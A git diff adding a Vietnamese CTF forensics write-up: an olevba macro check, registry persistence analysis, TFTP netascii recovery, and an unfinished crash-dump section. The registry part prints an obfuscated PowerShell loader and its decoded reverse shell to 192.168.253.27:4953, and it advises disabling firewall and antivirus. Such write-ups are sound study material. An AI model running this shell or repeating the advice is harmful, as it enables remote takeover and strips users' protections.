@@ -532,3 +532,235 @@ Kiểm tra số dư trong tài khoản của `alice` mình thấy số dư đã 
 Mua flag và mình nhận được flag. Chú ý nếu nhận được fake flag hãy thực hiện `Rollback` và thực hiện khai thác lại nhé.
 
 Flag: `CHH{BE_cAr3fUL_WitH_NE6ATIV3_NumBeR_d0b21424951572b39362d8414c0fb18b}`
+
+
+# Forensic chanllenge
+Tiếp theo là một số thử thách về Forensic mình giải được nhé. ☣️ Mình không có nhiều kinh nghiệm forensic và các mảng khác nên các bài này mình sẽ làm dựa trên google và những gì mình thôi nhé vì đây là CTF cá nhân nên cần càng nhiều point càng tốt 🔯. Hy vọng không bị bắt bẻ. Mình chỉ muốn học hỏi thêm để lỡ sau va chạm thực tế có thể sẽ gặp phải còn đỡ bỡ ngỡ. Một phần cũng muốn chứng minh mình đã cố gắng giải các thử thách này trong quá trình diễn ra CTF. 
+Một phần thì, các thử thách của anh `BQUAMAN` thực sự rất hay. 👩‍❤️‍👩 Quá đã  ~~~ 🌶️
+
+## Tin học văn phòng cơ bản
+### Mô tả
+```
+Sau khi tham gia một khóa Tin học văn phòng cơ bản, Hòa đã có thể tự tạo một tệp tài liệu độc hại và anh ta có ý định sẽ dùng nó để hack cả thế giới
+
+Tải challenge: https://drive.google.com/file/d/1WrLFE5qA-qJ6iLEQYQqCo0Xb99Yz8mTH/view?usp=drive_link (pass: cookiehanhoan)
+
+Format FLAG: CHH{XXX}
+```
+Nếu bạn không tìm thấy file trong drive nữa thì có thể tìm thấy [tại đây](https://github.com/TaiPhung217/CTF_writeup/blob/main/2023/Cookie%20Arena%202/source/arenas2-forensics-tin-hoc-van-phong-co-ban.zip)
+### Phân tích
+Sau khi giải nén file zip được cung cấp mình nhận được file .doc như vậy này.
+
+![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/4188d31c-f665-402d-ba4e-8ad7f6a5f47b)
+`Author: Long Nguyen` 😄
+
+### Solution
+Mình từng làm một số bài liên quan tới file doc, xls như này. Có một công cụ tên là `olevba`. Dùng để phân tích các file `.doc, .dot, .docm, .dotm, .xml, .mht, .xls, .xlsm, .xlsb, .pptm, .ppsm, VBA/VBScript source`
+```
+olevba là tập lệnh để phân tích các tệp OLE và OpenXML, chẳng hạn như tài liệu MS Office (ví dụ: Word, Excel), để phát hiện Macro VBA , trích xuất mã nguồn của chúng ở dạng văn bản rõ ràng và phát hiện các mẫu liên quan đến bảo mật như macro tự động thực thi , VBA đáng ngờ các từ khóa được sử dụng bởi phần mềm độc hại.
+```
+Sử dụng tools này nhanh như sau:
+Run các lệnh sau trong thư mục chứa file `doc`
+```
+docker pull cincan/oletools
+docker run -v "$(pwd):/samples" cincan/oletools olevba /samples/Challenge.doc
+```
+Và mình thấy flag ở trong MsgBox luôn:
+
+![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/baf2355a-7b29-4a96-854d-af2e5a3269a7)
+
+Flag: `CHH{If_u_w4nt_1_will_aft3rnull_u}`
+
+## Sổ đăng ký
+### Mô tả
+```
+Hòa thấy hiện tượng lạ mỗi khi anh ta khởi động máy tính. Anh ta nghĩ rằng việc tải các video không lành mạnh gần đây đã khiến máy tính của anh ta bị hack.
+
+Tải challenge: https://drive.google.com/file/d/1pShye_YtnUuIObPdnq9PeiIge0Oelsix/view?usp=drive_link (pass: cookiehanhoan)
+
+Format Flag: CHH{XXX}
+```
+Nếu bạn không tìm thấy file trong drive nữa thì có thể tìm thấy [tại đây](https://github.com/TaiPhung217/CTF_writeup/blob/main/2023/Cookie%20Arena%202/source/arenas2-forensics-so-dang-ki%20(1).zip)
+
+### Phân tích
+Sau khi tải và giải nén thì mình nhận được file như sau
+
+![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/c36c95d7-6bbc-4385-918e-10f688beaabb)
+
+Theo mình tìm hiểu, thì file `NTUSER.DAT` là một tệp tin định dạng registry của hệ điều hành MS Windows. Tệp tin này chứa cơ sở dữ liệu registry của một người dùng cụ thể trên hệ thống. Lưu trữ thông tin cấu hình, cài đặt và các thiết lập của hệ thống và ứng dụng.
+
+Mình có biết một công cụ tên là `regripper`. Dùng để trích xuất thông tin từ các tệp có định dạng Registry thông qua các plugin Perl.
+Cài đặt: `sudo apt install regripper`
+tham khảo: https://www.kali.org/tools/regripper
+
+Dựa vào mô tả thì mình đoán, file này có Persistent rồi. Và liên tưởng đầu tien của mình là `Software\Microsoft\Windows\CurrentVersion\Run` 😄 mình sẽ kiểm tra chỗ đó. Có một chall trên Hackthebox giống giống như này. 
+
+### Solution
+Chạy lệnh: 
+`sudo regripper -r NTUSER.DAT -a` 
+
+Với `-a` hoặc `-aT` nhé. Để tự động run các plugins.
+
+![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/61d1be56-8239-4e96-a6fc-7230e2d940b8)
+
+Kết quả đúng như mình đoán, có một đoạn mã được thực thi ở đây, trông rất khả nghi:
+
+![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/53dcbfea-c90b-4994-9cc2-b92f18ed3c19)
+
+Đoạn mã này gồm:
+```
+(neW-obJEct io.COMprEssIon.dEFlATesTReAm( [sySTem.IO.memorYSTREam] [coNVeRT]::FRoMBAse64stRInG( 'TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='), [SYSTEM.iO.ComPReSSion.CoMPrEsSIonmODe]::DeCOmpresS)|FOREAcH-object{ neW-obJEct io.streAMrEadeR( $_,[sysTem.TExt.EnCoDING]::asCIi )}).reaDToEnD()|inVOKe-exprEsSIon
+```
+Mình tìm hiểu một lúc: đoạn mã thực hiện giải mã một chuỗi ở định dạng base64 và nén bằng thuật toán Deflate.
+
+😄 Đến đây hơi khó khăn nhưng dựa vào các từ khóa thì mình đã tìm ra cách decode tại bài viết này: [Decode payload powershell](https://github.com/jas502n/Powshell-decode-payload)
+
+Hãy tắt hết tường lửa , phần mềm diệt virus để không có lỗi đỏ nhé.
+Tách lấy phần base64 và Chạy lệnh sau trong powershell:
+```
+PS C:\Windows\system32> sal a New-Object;(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()
+```
+
+Kết quả:
+```
+$client = New-Object System.Net.Sockets.TCPClient("192.168.253.27",4953);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "CHH{N0_4_go_n0_st4r_wh3r3}" + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+Flag: `CHH{N0_4_go_n0_st4r_wh3r3}`   😙 Quá đã 🌶️
+
+Mình có biết một công cụ để phân tích dạng file này là `volability`. Mình sẽ sử dụng version 2 cho dễ làm việc. version 3 mình chưa dùng.
+Chạy các lệnh sau trong thư mục có chứa file `NTUSER.DAT`
+```
+docker pull phocean/volatility
+docker run --rm --user=$(id -u):$(id -g) -v "$(pwd)":/dumps:ro,Z -ti phocean/volatility -f /dumps/NTUSER.DAT -h
+```
+
+## Trivial FTP
+### Mô tả
+```
+Việc những nhân viên của một công ty X sử dụng các giao thức không an toàn để kết nối và truyền tải tập tin từ xa đã tạo cơ hội cho những kẻ tấn công Man in the Middle và đánh cắp dữ liệu quan trọng của công ty
+
+Tải Challenge: https://drive.google.com/file/d/1AqsNR8eKe527iZJf1koNRs1pl9YhK0Ev/view?usp=drive_link (pass: cookiehanhoan)
+
+Format FLAG: CHH{XXX}
+```
+Nếu bạn không tìm thấy file trong drive nữa thì có thể tìm thấy [tại đây](https://github.com/TaiPhung217/CTF_writeup/blob/main/2023/Cookie%20Arena%202/source/arenas2-forensics-trivialFTP.zip)
+
+### Phân tích
+Mình được cung cấp một file `TrivialFTP.pcapng`. 
+Mở bằng Wireshark xem có gì không. Ặc 😥 file lớn vậy
+
+Đề bài gợi ý là giao thức FTP nên mình có xem trong packet này thì thấy fiel flag.pdf đồng thời mình cũng thấy Tranfer type được sử dụng ở đây là netascii.
+
+![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/9c688ad4-85ce-43d3-9448-45b004a22552)
+
+Sau một lúc bí bách mình sử dụng tool và extract ra được một file `flag.pdf version 1.5` NHưng không mở lên được 🥲
+
+Mình có tìm hiểu chút thì `netascii` là một trong các kiểu truyền dữ liệu trong TFTP. Khi một yêu cầu truyền tệp tin được thực hiện với kiểu netascii, nó sẽ khác với định dạng ban đầu, nếu ta trích xuất file từ packet nó có thể khác đi. Dữ liệu trong tệp tin sẽ được truyền dưới dạng ASCII và tuân thủ một số quy tắc định sẵn.
+
+```
+Các quy tắc netascii bao gồm:
+    Dữ liệu trong tệp tin chỉ bao gồm các ký tự ASCII từ 0 đến 127 (7-bit ASCII).
+    Kết thúc dòng được đại diện bằng chuỗi "\r\n" (carriage return và line feed).
+    Ký tự "\n" (line feed) không được sử dụng một mình mà phải được theo sau bởi ký tự "\r" (carriage return).
+    Ký tự "\r" có thể được sử dụng một mình để đại diện cho một dòng trống (line feed).
+```
+`netascii` sẽ encode ký tự newline biểu diễn bằng CR+LF (Carriage Return + Line Feed) và Ký tự CR đơn: Ký tự CR đơn được biểu diễn bằng chuỗi CR+NUL (Carriage Return + Null).
+
+![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/9a9da9cc-3021-4da5-aa1c-f6cfce06af28)
+
+Mình tham khảo tại đây [netascii.py](https://github.com/shylent/python-tx-tftp/blob/master/tftp/netascii.py) 
+
+### Solution
+Mở file `flag.pdf` decode ngược lại quy luật của netascii.
+
+script python
+```python
+import os
+import re
+
+CR = b'\x0d'
+LF = b'\x0a'
+CRLF = CR + LF
+NUL = b'\x00'
+CRNUL = CR + NUL
+
+# os.linesep is a byte string on Python 2 but a Unicode string on Python 3,
+# but we always want a byte string.
+if isinstance(os.linesep, bytes):
+    NL = os.linesep
+else:
+    NL = os.linesep.encode("ascii")
+
+re_from_netascii = re.compile(b'(\x0d\x0a|\x0d\x00)')
+
+def _convert_from_netascii(match_obj):
+    if match_obj.group(0) == CRLF:
+        return NL
+    elif match_obj.group(0) == CRNUL:
+        return CR
+
+def from_netascii(data):
+    """Convert a netascii-encoded string into a string with platform-specific
+    newlines.
+
+    """
+    return re_from_netascii.sub(_convert_from_netascii, data)
+
+with open('flag.pdf', 'rb') as file:
+        bytes = file.read()
+
+decode = from_netascii(bytes)
+
+with open('flag_decode.pdf', 'wb') as file:
+        file.write(decode)
+```
+
+kết quả xuất ra một file `flag_decode.pdf`. 
+
+Mình mở bằng trình đọc pdf onlien thì lấy được cờ. 
+
+![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/3c6f9bb2-8b46-423c-9127-602782d22fbb)
+
+Flag: `CHH{FTP_4nd_TFTP_4r3_b0th_un$af3}`
+
+Quá đã. mỗi ngày một kiến thức mới. 😙 🥰
+
+tham khảo:
+https://rainbowpigeon.me/posts/recovering-graphics-from-a-broken-pdf/
+https://www.google.com/search?q=objects+in+pdf+CTF&sxsrf=AB5stBjrHCpPbYyR5Ocs8QTVFwAgMAd_-A%3A1688828937506&ei=CXypZO3AHpSBmgbJo7qQBg&ved=0ahUKEwit6Z-Hsv__AhWUgMYKHcmRDmIQ4dUDCBA&uact=5&oq=objects+in+pdf+CTF&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQA0oECEEYAFAAWABgtwFoAHABeACAAU-IAU-SAQExmAEAoAEBwAEB&sclient=gws-wiz-serp
+https://www.mankier.com/1/mutool#Clean
+https://www.google.com/search?q=mutool+pdf+ctf&oq=mutool+pdf+ctf&aqs=chrome..69i57.4400j0j9&sourceid=chrome&ie=UTF-8
+https://silencemaydaycom.wordpress.com/2021/01/31/justcatthefish-2020/
+https://zenn.dev/fiord/articles/da623cb6e9e868793388
+https://ctftime.org/writeup/25847
+https://inria.hal.science/hal-02082806/document
+https://ctftime.org/writeup/16409
+
+## Báo cáo dang dở
+### Mô tả
+```
+Hòa đang làm báo cáo bài tập lớn để nộp cho thầy giáo thì bỗng nhiên máy tính của anh ấy bị tắt đột ngột do mất điện mà anh ấy thì chưa kịp lưu báo cáo một lần nào. Tuy nhiên sau đó, thay vì viết báo cáo mới thì Hòa đã chọn cách dành ra 4h đồng hồ để khôi phục báo cáo ban đầu từ tệp crash dump nhưng cuối cùng vẫn thất bại. Hòa thực sự đang cần trợ giúp.
+
+Tải Challenge ở đây: https://drive.google.com/file/d/19OCHSjzHmzFBoSLYB90nkrZLnREpZ1nG/view?usp=drive_link (pass: cookiehanhoan)
+
+Format Flag: CHH{XXX}
+```
+### Phân tích
+Mình được cung cấp file như sau:
+![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/3d356452-6ae7-45e7-b44f-ced1f7b73400)
+
+Tìm hiểu một chút thì đây là một file crash dump trong hệ thống 
+
+### Solution
+
+### Solution
+Trước hết mình cần biết profile. Mình sử dụng option `imageinfo`
+
+![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/f6cb78b6-7764-4387-9552-f9936886debb)
+
+Hể chả có gì cả. Sau một hồi google thì mình thấy 
+
+
+
+
